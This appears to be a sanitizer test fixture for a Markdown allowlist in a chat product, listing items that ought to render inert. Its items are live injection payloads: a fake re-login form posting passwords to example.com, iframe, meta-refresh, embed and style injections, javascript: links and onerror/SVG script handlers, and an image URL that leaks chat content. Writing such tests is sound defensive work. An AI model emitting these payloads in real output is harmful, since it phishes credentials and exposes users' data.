Markdown allowlist check for aihub-core-private#389. Every item below must render as plain text or not at all.

<div class="fixed inset-0 z-50 flex items-center justify-center bg-white" style="position:fixed;inset:0;z-index:9999;background:#fff;display:flex;align-items:center;justify-content:center">
<form action="https://example.com/collect" method="post" style="border:1px solid #ccc;padding:2rem;border-radius:1rem"><h2>Session expired</h2><p>Please re-enter your password to continue.</p><input name="username" placeholder="E-mail"><br><input type="password" name="password" placeholder="Password"><br><button>Sign in</button></form>
</div>

<iframe src="data:text/html,<h1>Content from an injected iframe</h1>" width="420" height="90"></iframe>

<style>body { outline: 12px solid #dc2626; outline-offset: -12px; }</style>

<meta http-equiv="refresh" content="5;url=https://example.com/?redirected-by-markdown">

<embed src="https://example.com/plugin.swf"><object data="https://example.com/object"></object>

<svg width="160" height="30"><a><animate attributeName="href" values="javascript:alert('svg animate')"/><text y="20">SVG link</text></a></svg>

<img src="x" onerror="alert('img onerror')">

[A javascript: link](javascript:alert('link'))

![An external image that would leak data](https://example.com/pixel.png?leak=chat-content)
